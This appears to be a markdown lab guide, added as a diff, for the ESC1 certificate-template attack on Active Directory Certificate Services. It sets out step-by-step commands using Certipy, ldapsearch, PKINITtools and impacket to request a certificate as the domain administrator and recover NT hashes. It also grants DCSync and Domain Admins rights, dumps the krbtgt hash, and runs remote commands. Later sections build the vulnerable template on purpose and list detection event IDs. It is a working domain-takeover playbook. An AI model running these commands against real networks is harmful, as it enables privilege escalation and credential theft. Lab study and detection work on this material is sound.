@@ -1,0 +1,152 @@
+## 1. Enumerate
+
+Fast path:
+
+```bash
+nxc ldap corp.local -u bob -p 'P@ssw0rd' -M adcs
+certipy find -u bob@corp.local -p 'P@ssw0rd' -dc-ip 10.10.10.10 -vulnerable -stdout
+```
+
+`-verbose` instead of `-vulnerable` gives the full matrix (EKUs, flags, ACL). Certipy also drops `*_Certipy.json`:
+
+```bash
+jq -r '.Certificate Templates | to_entries[]
+  | select(.value."Enrollee Supplies Subject" == true)
+  | [.key, .value."Extended Key Usage", .value."Enrollment Rights"]
+  | @tsv' 20261119_Certipy.json
+```
+
+No Certipy? Raw LDAP, exactly the flag that matters:
+
+```bash
+ldapsearch -x -H ldap://10.10.10.10 -D 'bob@corp.local' -w 'P@ssw0rd' \
+  -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
+  '(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=1))' \
+  cn pKIExtendedKeyUsage msPKI-Enrollment-Flag msPKI-RA-Signature
+```
+
+`1.2.840.113556.1.4.803` is the bitwise-AND matching rule — `:=1` tests `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`.
+
+Also enumerate which templates the CA actually publishes (a template can be vulnerable and unpublished → `CERTSRV_E_TEMPLATE_DENIED`):
+
+```bash
+ldapsearch -x -H ldap://10.10.10.10 -D 'bob@corp.local' -w 'P@ssw0rd' \
+  -b 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
+  '(objectClass=pKIEnrollmentService)' cn dNSHostName certificateTemplates
+```
+
+## 2. Request
+
+```bash
+certipy req -u bob@corp.local -p 'P@ssw0rd' -dc-ip 10.10.10.10 \
+  -ca 'CORP-CA' -template 'VulnUser' \
+  -upn 'administrator@corp.local' \
+  -out administrator
+```
+
+Variants worth knowing:
+
+```bash
+# strong mapping (KB5014754) enforced -> embed SID
+certipy req ... -sid S-1-5-21-1111111111-2222222222-3333333333-500
+
+# RPC blocked -> WebEnrollment
+certipy req ... -web
+
+# impersonate a computer (S4U/RBCD style abuse) instead of a user
+certipy req ... -dns 'dc.corp.local' -template 'VulnComputer'
+
+# deterministic key material for reuse in a second tool
+certipy req ... -key-size 4096 -out administrator -debug
+```
+
+`-ca 'dc.corp.local\CORP-CA'` if the short name is ambiguous. The output PFX is conventionally protected with an empty password in Certipy. Non-empty: `-pfx-password`.
+
+## 3. Authenticate
+
+**PKINIT → TGT + NT hash (UnPAC-the-hash):**
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
+```
+
+**LDAP Schannel → mutate AD with no hash** (preferred when the KDC has no cert, or when you want precise changes):
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell
+# ldap-shell: help
+# grant_dcsync administrator
+# add_user_to_group bob "Domain Admins"
+# set_rbcd dc.corp.local attacker$
+# change_password bob 'NewP@ssw0rd!'
+```
+
+**Raw PKINITtools** (when you want the AS-REP key and manual control):
+
+```bash
+git clone https://github.com/dirkjanm/PKINITtools && cd PKINITtools
+python3 gettgtpkinit.py -cert-pfx ../administrator.pfx -pfx-pass '' corp.local/administrator administrator.ccache
+export KRB5CCNAME=administrator.ccache
+python3 getnthash.py -key <AS-REP-enc-key> corp.local/administrator
+```
+
+Then standard Kali post:
+
+```bash
+impacket-secretsdump -hashes :<nthash> -just-dc-user krbtgt corp.local/administrator@10.10.10.10
+nxc winrm corp.local -u administrator -H <nthash> -x whoami
+```
+
+`certipy auth` also accepts `-pfx` + `-username`/`-domain` if the SAN doesn't imply the account.
+
+## 4. Troubleshooting matrix
+
+| Error | Cause | Kali fix |
+|---|---|---|
+| `KDC_ERR_PADATA_TYPE_NOSUPP` | DC has no KDC cert; PKINIT unsupported | enroll DC in *Kerberos Authentication* template, or use `-ldap-shell` |
+| `KDC_ERR_CLIENT_NAME_MISMATCH` | SAN ≠ `-username` | correct `-upn`, or add `-username administrator` |
+| `KDC_ERR_INCONSISTENT_KEY_PURPOSE` | template EKU isn't logon-capable | fix template EKU (Client Auth / PKINIT / Any Purpose) |
+| `Cannot find KDC for realm` | bad DNS resolution on Kali | `-ns 10.10.10.10`, `/etc/hosts` |
+| `KRB_AP_ERR_SKEW` | clock drift | `sudo chronyc makestep` |
+| AS-REP but no `Got hash` line | machine/trust account, or no PAC creds | `-ldap-shell`, or `getnthash.py` with the AS-REP key |
+| `rpc_s_access_denied` on `req` | no Enroll right + no `-web` | check template ACL / use `-web` |
+| `CERTSRV_E_TEMPLATE_DENIED` | template not published on CA | publish in `certsrv.msc` |
+| `The request is pending` | manager approval on | not ESC1, needs approver |
+
+Always re-run a failing step with `-debug` before changing tools; Certipy prints the raw `RequestId` / status.
+
+## 5. Building the vulnerable lab template (so it's reproducible)
+
+On the CA box, `certtmpl.msc` → duplicate *User* → rename `VulnUser`:
+
+- **Subject Name** → *Supply in the request*
+- **Extensions** → Client Authentication (keep or replace existing EKUs)
+- **Security** → `Domain Users` = Read + Enroll
+- leave **Issuance Requirements** empty (no manager approval, no authorized signatures)
+
+Publish: `certsrv.msc` → *Certificate Templates* → New → `VulnUser`. Restart the service or it caches the list:
+
+```powershell
+Restart-Service CertSvc
+```
+
+Confirm from Kali before attacking:
+
+```bash
+certipy find -u bob@corp.local -p 'P@ssw0rd' -dc-ip 10.10.10.10 -template VulnUser -stdout
+```
+
+If PKINIT is part of the exercise, verify the DC itself holds a KDC cert:
+
+```bash
+certipy find ... -stdout | grep -A2 "Kerberos Authentication"
+certutil -store My   # on the DC
+```
+
+## 6. Lab hygiene
+
+- `certipy auth` leaves `.ccache` files; `rm -f *.ccache *.pfx` after each run.
+- Issued certs stay valid to expiry; revoke on the CA (`certsrv.msc` → *Revoked Certificates*) and note that PKINIT generally ignores CRL — that's a finding, not a bug in your tooling.
+- Snapshot the DC before template edits; `Restart-Service CertSvc` on a live DC briefly interrupts enrollment.
+
+For detection engineering, capture on Kali-side timestamps and correlate with CA events **4886/4887** and DC **4768** (PKINIT) — the SAN-in-request vs. requester mismatch in 4886 is the cleanest signal.
